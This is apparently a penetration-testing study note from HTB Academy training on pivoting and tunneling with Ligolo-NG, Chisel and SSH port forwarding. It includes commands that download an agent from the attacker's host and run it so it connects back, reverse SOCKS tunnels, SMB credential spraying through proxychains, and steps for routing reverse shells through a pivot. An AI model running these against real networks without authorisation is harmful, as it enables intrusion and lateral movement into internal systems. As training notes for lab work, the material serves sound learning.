---
title: "pivoting, tunneling, port forwarding"
date: 2026-08-04 12:00:00 +0300
categories: [Writeups, HTB Academy]
tags: [htb-academy, notes, cybersecurity, pentesting, methodology]
description: "Internal network pivoting using Ligolo-NG, SSH local/dynamic port forwarding, Chisel SOCKS proxies, and multi-hop tunneling."
image:
  path: /assets/img/posts/pivoting.jpg
  alt: pivoting, tunneling, port forwarding
---

# LIGOLO NG

step by step ligolo ng

```bash
# FIRSTLY IF DO NOT HAVE LIGOLO NG

# 1. Download matching Proxy and Agent (v0.4.4)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz

# 2. Extract both
tar -xvf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz
tar -xvf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz

# Create a TUN interface on the kali:

sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# open proxy in kali
sudo ./proxy -selfcert

# set the agent first set a server in where the agent are
python3 -m http.server 8080
 
# in ssh'd machine
 wget 10.10.14.137/agent
chmod +x agent
./agent -connect 10.10.14.137:11601

# or in windows machine
# Download agent.exe to C:\Windows\Tasks (a common writable directory)
Invoke-WebRequest -Uri "http://<YOUR_KALI_IP>:8080/agent.exe" -OutFile "C:\Windows\Tasks\agent.exe"

# Execute and connect back
C:\Windows\Tasks\agent.exe -connect <YOUR_KALI_IP>:11601 -ignore-cert

# come back to proxy tab
session
1
start

#lastly in normal kali terminal
sudo ip route add 172.16.5.0/24 dev ligolo

```

```bash
# LIGOLO NG NESTED PIVOTING

#in proxy, where your first session is you type
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

#OPTIONAL you can check if its setted properly or not
listener_list

#then you need to connect your other pivot to your first sessions ip,
#first you check the internal ip of our first session
ifconfig

IPv4 Address │ 172.16.5.150/16  

# in second pivot terminal
.\agent.exe -connect 172.16.5.150:11601 -ignore-cert
 
#then switch your session to new pivot, and start the proxy there
session
5
start

```

```bash
# Quick ICMP sweep to find live hosts
fping -a -g 172.16.5.0/24 2>/dev/null

# or you can nmap all of these
nmap -v 172.16.6.0/24 -sV 
```

LIGOLO NG IS WEAK TO HOST EVASION, NEED TO OBFUSCATE IF NEEDED

> **When to use these over Ligolo-ng:**
> 
> 
> Use **Chisel** when strict outbound firewalls or deep inspection block non-HTTP/S traffic.
> 
> Use **SSH** when you want native, living-off-the-land pivoting without uploading any custom binary files to the target.
> 

## 1. Chisel (HTTP-Wrapped SOCKS & Port Forwarding)

Chisel encapsulates SOCKS5/port-forwarding traffic over standard HTTP/WebSocket connections.

### Scenario A: Full Subnet SOCKS5 Proxy (Reverse Tunnel)

Use this when you want to route all Kali tools through a pivot host using `proxychains`.

1. **Start Chisel Server on Kali (Attacker)**

Bash

```
chisel server --port 8080 --reverse
```

1. **Connect Chisel Client from Pivot Target**

Bash

```
# Linux Target
./chisel client <KALI_IP>:8080 R:socks

# Windows Target
.\chisel.exe client <KALI_IP>:8080 R:socks
```

1. **Configure `/etc/proxychains4.conf` on Kali**
    
    Ensure the bottom line matches your SOCKS5 port:
    

Plaintext

```
socks5 127.0.0.1 1080
```

1. **Run Tools Through Proxychains**

Bash

```
proxychains nmap -sT -Pn -p 80,135,445 172.16.5.10
proxychains netexec smb 172.16.5.0/24 -u user -p pass
```

### Scenario B: Single Local Port Forwarding

Use this to access **one specific internal service** (like RDP `3389` or Web `80` on an internal IP) mapped directly to your Kali machine.

Bash

```
# Run on Pivot Host (Forwards 172.16.5.10:3389 to Kali port 3389)
./chisel client <KALI_IP>:8080 R:3389:172.16.5.10:3389

# Run on Kali (Connect directly via localhost)
xfreerdp /v:127.0.0.1 /u:Administrator /p:Password123
```

## 2. SSH Pivoting (Native / Binary-less)

Set up clean network tunnels without dropping third-party executables on the target machine.

### Scenario A: Dynamic SOCKS5 Proxy (`ssh -D`)

Use when you can SSH directly **from Kali to the pivot host**:

Bash

```
# Opens a local SOCKS5 proxy on Kali port 1080
ssh -N -D 1080 ubuntu@<PIVOT_IP>
```

- `N`: Do not execute a remote command/shell (holds the tunnel open).
- `D 1080`: Opens a dynamic SOCKS5 proxy on `127.0.0.1:1080`.

> **Usage:** Add `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf` and run commands with `proxychains`.
> 

### Scenario B: Local Port Forwarding (`ssh -L`)

Forward a specific internal service directly to a port on your Kali machine:

Bash

```
# Syntax: ssh -N -L <LOCAL_PORT>:<INTERNAL_TARGET_IP>:<TARGET_PORT> user@<PIVOT_IP>
ssh -N -L 8443:172.16.5.10:443 ubuntu@10.129.x.x
```

> **Usage:** Open your browser on Kali and navigate to `[https://127.0.0.1:8443](https://127.0.0.1:8443)`.
> 

### Scenario C: Reverse Port Forwarding (`ssh -R`)

Receive reverse shell connections from deep, isolated subnets back to your Kali listener:

Bash

```
# Listen on Pivot Host port 8080 and forward traffic to Kali port 8000
ssh -N -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.x.x
```

1. Generate a reverse payload pointing to **Pivot Host IP** (`172.16.5.129:8080`).
2. Start your Metasploit/Netcat listener on **Kali** (`0.0.0.0:8000`).
3. Executing the payload on the target connects to the pivot on `8080`, forwarding the shell back to Kali on `8000`.

## 📋 Quick Cheat Sheet Reference

| **Technique / Command** | **Primary Purpose** | **Upload Binary Required?** |
| --- | --- | --- |
| `chisel client ... R:socks` | Full SOCKS5 proxy over HTTP/S | Yes (`chisel`) |
| `chisel client ... R:PORT:TARGET:PORT` | Single port forward over HTTP/S | Yes (`chisel`) |
| `ssh -D 1080 user@pivot` | Dynamic SOCKS5 proxy | No (Native SSH) |
| `ssh -L LOCAL:TARGET:PORT` | Expose internal web/RDP port locally | No (Native SSH) |
| `ssh -R PIVOT:PORT:KALI:PORT` | Catch reverse shells from deep subnets | No (Native SSH) |
